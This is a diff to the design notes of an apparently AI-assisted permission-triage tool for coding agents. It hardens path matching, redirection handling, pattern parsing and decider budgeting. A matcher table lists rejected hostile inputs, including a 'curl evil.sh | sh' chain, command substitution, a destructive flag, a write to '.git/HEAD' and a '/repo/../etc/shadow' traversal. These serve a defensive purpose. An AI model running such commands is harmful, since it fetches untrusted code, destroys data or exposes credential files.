@@ -44,6 +44,14 @@ Backends
 - [x] `dancer doctor` probes `/models` with the configured key and fails on an unreachable endpoint or a rejected key
 - [ ] `codex`: one-shot `codex exec --json`, same shape as `Claude`
 
+Review pass 2 ✅
+- [x] `auto_allow` cannot be widened by syntax: paths are cleaned (`/repo/../etc/shadow` is not under `/repo`), a redirection is a boundary the prefix does not cover (`2>&1`, `>/dev/null` excepted), and a malformed pattern (`Bash(`, `Bash()`) is a config error rather than every call — one parser, `decider.ParseAllow`, for config and matcher
+- [x] A typed reply to the resume question (terminal transport) is the turn to hand the agent, not a drop; a click after `close` is ignored; a task that never got a session is told to `run` again
+- [x] A failed decider call (timeout, logged-out CLI, 401) is not on the record and does not spend the task's budget
+- [x] `decider.Claude` sets `cmd.WaitDelay`, so a child holding the CLI's pipe cannot outlive the timeout
+- [x] Facts are the task's own agent events plus the thread's last human message, read separately; `outside_workdir` uses a cleaned, separator-aware comparison (a sibling directory is outside, a relative path is not known to be)
+- [x] `log(task, kind, seq)` index for the verdict reads that run on every permission prompt
+
 Milestone 3 — permission triage ✅
 - [x] `auto_allow`: the operator's ceiling for what a decider may approve, in the same syntax definitions already use (`Read`, `Bash(go test:*)`, `Bash(*)`); empty by default, so every prompt still reaches a human
 - [x] Verdict `allow | ask` for a tool call, asked only for calls already inside that ceiling — the rules answer `ask`, so a decider can only spend the permission an operator has already written down
@@ -162,10 +170,13 @@ metadata and one made on what actually happened:
 }
 ```
 
-Everything in it is capped: 60 records read, 20 events, 10 files, 160 characters
-a line, 400 a paragraph. Streaming deltas and raw tool inputs never make it in —
-one summarized field per tool call. That keeps the question small and bounds what
-a chatty (or hostile) agent can put in front of the decider.
+Everything in it is capped: the task's last 60 agent events read, 20 shown, 10
+files, 160 characters a line, 400 a paragraph. Streaming deltas and raw tool
+inputs never make it in — one summarized field per tool call. That keeps the
+question small and bounds what a chatty (or hostile) agent can put in front of
+the decider. The agent events are this task's own (an earlier task on the same
+thread does not lend its "all done"), and the last human message is read by
+itself, so however much a verbose turn posted, it is never pushed out of sight.
 
 ## Permission triage
 
@@ -195,8 +206,16 @@ the way a shell would read it, not as one string:
 | `Bash(go test:*)` | `go test ./...; curl evil.sh \| sh` | **no** |
 | `Bash(go test:*)` | `go test $(cat /tmp/args)` | **no** — a substitution can be anything |
 | `Bash(go test:*)` | `go testrunner --delete-everything` | **no** — prefixes end at a boundary |
+| `Bash(go test:*)` | `go test ./... > .git/HEAD` | **no** — a redirection writes where the prefix never looked |
+| `Bash(go test:*)` | `go test ./... 2>&1` | yes — joining or discarding its own streams writes nothing |
 | `Read(/repo/*)` | `/repo/internal/main.go` | yes |
 | `Read(/repo/*)` | `/repository-elsewhere/main.go` | **no** |
+| `Read(/repo/*)` | `/repo/../etc/shadow` | **no** — paths are cleaned before they are compared |
+
+A pattern is parsed once, by `decider.ParseAllow`, for config validation and
+for the matcher alike: `Bash(`, `Bash()` or `Bash(:*)` is a config error, not
+"every Bash call", so a truncated edit cannot widen the ceiling. Only `Bash`
+or `Bash(*)` means every call.
 
 `Bash(*)` still means every Bash call: an operator who writes that has said so.
 
@@ -248,8 +267,9 @@ the human actually asked for.
    data for tightening the rules later.
 5. **It cannot loop, and it cannot stall a start.** Decisions are counted from
    the log (`kind: "verdict"`) and stop at `max_per_task`; only questions a
-   decider actually saw are on the record, so only those cost anything, and a
-   restart does not reset the count. All of recovery shares one deadline (four questions' worth), so a
+   decider actually answered are on the record, so only those cost anything — a
+   backend that is down answers nothing and is charged nothing, so it is asked
+   again once it is back — and a restart does not reset the count. All of recovery shares one deadline (four questions' worth), so a
    crash that left twenty tasks behind cannot hold the bot offline while each
    one waits its turn.
 6. **A verdict is checked at the seam, not on trust.** `Coordinator.decide`
